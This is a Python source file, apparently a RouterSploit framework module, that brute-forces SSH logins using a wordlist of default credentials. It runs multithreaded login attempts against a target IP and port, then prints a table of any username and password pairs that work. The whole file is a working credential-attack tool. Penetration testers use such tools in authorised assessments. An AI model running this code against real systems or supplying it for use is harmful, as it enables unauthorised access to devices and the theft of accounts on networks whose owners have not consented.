from routersploit.core.exploit import *
from routersploit.core.ssh.ssh_client import SSHClient
from routersploit.resources import wordlists


class Exploit(SSHClient):
    __info__ = {
        "name": "SSH Default Creds",
        "description": "Module performs bruteforce attack against SSH service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")

    threads = OptInteger(8, "Number of threads")

    defaults = OptWordlist(wordlists.defaults, "User:Pass or file with default credentials (file://)")

    verbosity = OptBool("true", "Display authentication attempts")
    stop_on_success = OptBool("true", "Stop on first valid authentication attempt")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default credentials attack against SSH service")

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next().split(":")
                ssh = self.ssh_login(username, password)
                if ssh:
                    if self.stop_on_success:
                        running.clear()

                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))
                    ssh.close()

            except StopIteration:
                break

    def check(self):
        if self.ssh_test_connect():
            print_status("Target exposes SSH service", verbose=self.verbosity)
            return True

        print_status("Target does not expose SSH", verbose=self.verbosity)
        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []

            data = LockedIterator(self.defaults)
            self.run_threads(self.threads, self.target_function, data)

            if self.credentials:
                return self.credentials

        return None
